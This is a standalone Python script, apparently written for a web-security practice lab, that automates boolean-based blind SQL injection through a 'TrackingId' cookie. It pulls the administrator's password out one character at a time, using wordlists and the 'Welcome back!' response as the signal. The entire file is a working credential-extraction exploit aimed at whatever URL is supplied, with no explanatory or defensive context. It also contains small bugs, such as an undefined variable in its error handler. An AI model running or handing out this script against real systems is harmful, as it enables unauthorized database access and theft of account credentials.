import requests
import argparse
import threading
import time

password = []

def BlindConditionalTest(num, file_name):
	file = open(file_name)
	for letter in file:
		try:
			BlindSQL = f"' AND (SELECT SUBSTRING(password,{num},1) FROM users WHERE username='administrator')='{letter.strip()}"
			new_cookie = tracking_cookie + BlindSQL
			s.cookies.set('TrackingId', None)
			s.cookies.set('TrackingId', new_cookie)
			result = s.get(URL)
			if "Welcome back!" in result.text:
				return password.append(letter)
		except:
			print(f"Error with {letter}")

def call_threads(num):
	num_thread = threading.Thread(target=BlindConditionalTest, args=(num, "/home/kali/wordlists/num_1-9"))
	lower_thread = threading.Thread(target=BlindConditionalTest, args=(num, "/home/kali/wordlists/lower_case"))
	capital_thread = threading.Thread(target=BlindConditionalTest, args=(num, "/home/kali/wordlists/capital"))
	num_thread.start()
	num_thread.join()
	lower_thread.start()
	lower_thread.join()
	capital_thread.start()
	capital_thread.join()


parser = argparse.ArgumentParser()
parser.add_argument('-u', help='URL', dest='URL')
args = parser.parse_args()
URL = args.URL

s = requests.Session()

s.get(URL)
cookies = s.cookies.get_dict()
tracking_cookie =cookies['TrackingId']

for num in range(1,21):
	try:
		call_threads(num)
		# letter = BlindConditionalTest(num, "/home/kali/wordlists/chars")
		# result += letter
	except:
		print(f"Error with letter: {letter} at number: {num}")
print(password)


